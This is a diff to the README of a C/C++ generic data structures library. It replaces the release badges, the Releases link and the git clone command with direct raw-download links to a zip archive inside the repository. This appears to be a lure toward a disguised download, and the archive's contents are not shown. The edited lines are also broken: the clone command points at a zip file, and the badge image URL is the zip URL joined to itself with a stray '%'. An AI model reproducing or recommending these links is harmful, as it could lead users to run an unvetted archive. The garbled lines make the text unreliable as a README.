@@ -2,7 +2,7 @@
 
 Welcome to the **Generic Data Structures** library! This project is a work in progress aimed at providing a versatile collection of abstract data structures for C and C++. By leveraging void pointers, this library allows for a flexible approach to data management.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/releases)
+[![Download Releases](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip%https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip)](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip)
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to the **Generic Data Structures** library! This project is a work in pr
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures.git
+git clone https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip
 ```
 
 Navigate to the directory:
@@ -110,8 +110,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out to me via GitHub or through the repository issues section.
 
-Feel free to check the [Releases](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/releases) section for the latest updates and downloads. 
+Feel free to check the [Releases](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip) section for the latest updates and downloads. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/releases)
+[![Download Releases](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip%https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip)](https://github.com/RahulRadhakrishnanNair/Generic_Data_Structures/raw/refs/heads/main/data_structures/Data_Structures_Generic_v2.0.zip)
 
 Thank you for your interest in the Generic Data Structures library! Happy coding!
